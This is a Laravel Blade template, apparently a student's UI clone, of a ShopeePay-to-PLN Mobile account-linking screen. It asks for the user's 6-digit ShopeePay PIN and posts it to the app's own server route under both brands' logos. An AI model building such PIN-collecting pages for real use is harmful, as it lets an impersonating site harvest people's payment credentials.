{{-- 5026231037 AL-KHIQMAH MANZILATUL MUKAROMAH  --}}
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hubungkan shopeePay</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
        integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
        integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="icon" href="{{ asset('assets/img/logo.png') }}" sizes="any">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Poppins:wght@400;500;600;700&display=swap"
        rel="stylesheet">

    <link rel="stylesheet" href="css/hubungkan-ewallet/verifikasi.css">
</head>

<body>

    <div class="background-wave">
        <img src="assets/img/wave.svg" alt="Latar Belakang Gelombang" class="wave-image">
    </div>


    <div class="bg-transparant header-container">
        <div class="container header-content-wrapper">
            <div class="d-flex align-items-center justify-content-between">
                <a href="#" class="text-decoration-none text-dark back-button">
                    <i class="fa-solid fa-arrow-left fa-xl"></i>
                </a>
                <h1 class="h5 m-0 font-weight-bold text-center w-100 text-dark header-title">
                    <span>Hubungkan shopeePay</span>
                </h1>
                <div class="placeholder-space"></div>
            </div>
        </div>
    </div>

    <div class="container main-content-wrapper">
        <div class="card bg-white p-4 card-popup border-0">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <div class="logo-wrapper">
                    <img src="assets/img/e-wallete/shopee.svg" alt="shopeePay Icon" class="img-fluid logo-image">
                </div>

                <div class="d-flex mx-3 step-indicator-wrapper">
                    <span class="rounded-circle bg-info step-active"></span>
                    <span class="rounded-circle bg-secondary step-active"></span>
                    <span class="rounded-circle bg-secondary step-inactive"></span>
                    <span class="rounded-circle bg-secondary step-inactive"></span>
                </div>

                <div class="logo-wrapper">
                    <img src="assets/img/e-wallete/pln.svg" alt="PLN Mobile Logo" class="img-fluid logo-image">
                </div>
            </div>

            <p class="text-secondary small mb-2">Nomor HP Anda</p>
            <div class="input-group mb-4 custom-input-group">
                <div class="input-group-prepend">
                    <span class="input-group-text bg-white border-0">
                        <i class="fa-solid fa-phone text-secondary"></i>
                    </span>
                </div>
                <input type="tel" class="form-control border-0 phone-input" value="{{ request('phone') }}"
                    aria-label="Nomor HP" readonly>
            </div>

            <h6 class="font-weight-bold mb-3 terms-title">Syarat & Ketentuan</h6>
            <ol class="pl-3 terms-list">
                <li class="mb-2 terms-item">
                    Sudah memiliki Akun shopeePay , dan aktivasi shopeePay payment.
                </li>
                <li class="mb-2 terms-item">
                    Saldo shopeePay cukup untuk membeli produk di PLN Mobile.
                </li>
                <li class="mb-2 terms-item">
                    Anda akan menghubungkan akun shopeePay anda dengan PLN Mobile dan setelah dihubungkan shopeePay baru
                    bisa
                    digunakan sebagai pembayaran di PLN Mobile.
                </li>
            </ol>
        </div>
    </div>

    <div class="modal fade show d-flex align-items-end modal-overlay" tabindex="-1" role="dialog" aria-modal="true"
        aria-labelledby="verificationModalLabel">
        <div class="modal-dialog w-100 m-0 modal-fixed-bottom" role="document">

            <div class="modal-content modal-content-bottom border-0">

                <div class="text-center pt-2 pb-3 modal-drag-handle">
                    <div class="drag-handle-bar"></div>
                </div>

                <div class="modal-body text-center px-4 pt-0 pb-4">
                    <h5 class="modal-title font-weight-bold mb-4" id="verificationModalLabel">
                        Proses Verifikasi
                    </h5>

                    <p class="mb-4">Masukkan 6 digit PIN shopeePay </p>
                    <form method="POST" action="{{ route('verifikasi.shopepay') }}">
                        @csrf
                        <input type="hidden" name="phone" value="{{ request('phone') }}">

                        <div class="d-flex justify-content-center mb-3">
                            <input type="password" maxlength="1" class="pin-input" data-index="0">
                            <input type="password" maxlength="1" class="pin-input" data-index="1">
                            <input type="password" maxlength="1" class="pin-input" data-index="2">
                            <input type="password" maxlength="1" class="pin-input" data-index="3">
                            <input type="password" maxlength="1" class="pin-input" data-index="4">
                            <input type="password" maxlength="1" class="pin-input" data-index="5">
                            <input type="hidden" name="verifikasi" id="verifikasi">
                        </div>

                        <a href="#" class="text-info small mb-4 d-block">Lupa PIN?</a>

                        <button type="submit" class="btn btn-block poppins-regular enter-button">
                            Masukkan
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </div>


    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"
        integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous">
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous">
    </script>
    <script>
        document.querySelector('form').addEventListener('submit', function(e) {
            let pin = '';
            document.querySelectorAll('.pin-input').forEach(function(input) {
                pin += input.value;
            });
            document.getElementById('verifikasi').value = pin;
        });
    </script>
</body>

</html>
